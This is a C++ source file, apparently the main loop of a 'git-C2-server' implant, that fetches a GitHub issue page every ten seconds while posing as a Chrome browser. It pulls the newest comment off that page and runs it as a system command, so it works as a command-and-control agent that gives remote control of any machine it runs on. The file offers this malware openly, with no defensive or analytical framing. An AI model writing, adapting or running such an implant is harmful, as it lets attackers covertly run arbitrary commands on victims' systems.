#include "include/httpRequest.hpp"
#include "include/fileManager.hpp"
#include "include/htmlParser.hpp"
#include "include/cmd.hpp"
#include "include/execCmd.hpp"
#include <iostream>
#include <chrono>
#include <thread>

int main() {
    HttpRequest httpRequest;  

    std::string url = "https://github.com/Momollax/git-C2-server/issues/2";
    std::string userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";

    Cmd cmd;
    HtmlParser htmlParser(cmd);
    ExecCmd execCmd("");  // Créez une instance d'ExecCmd avec une commande vide

    while (true) {
        // Effectuer la requête et extraire le contenu
        std::string response = httpRequest.get(url, userAgent);
        std::string extractedContent = htmlParser.extractContent(response);

        // Vérifier si le nombre de contenus a augmenté
        if (cmd.addContentIfChanged(extractedContent)) {
            // Afficher tous les contenus extraits
            const std::vector<std::string>& allContent = cmd.getAllContent();
            //std::cout << "All extracted content:\n";
            //for (const auto& content : allContent) {
            //    std::cout << content << std::endl;
            //}

            // Afficher le dernier contenu extrait
            const std::string& lastContent = cmd.getLastContent();
            // td::cout << "Last extracted content:\n" << lastContent << std::endl;

            ExecCmd execCmd(lastContent);
            execCmd.executeCommand();
        }
        std::this_thread::sleep_for(std::chrono::seconds(10));
    }

    return 0;
}
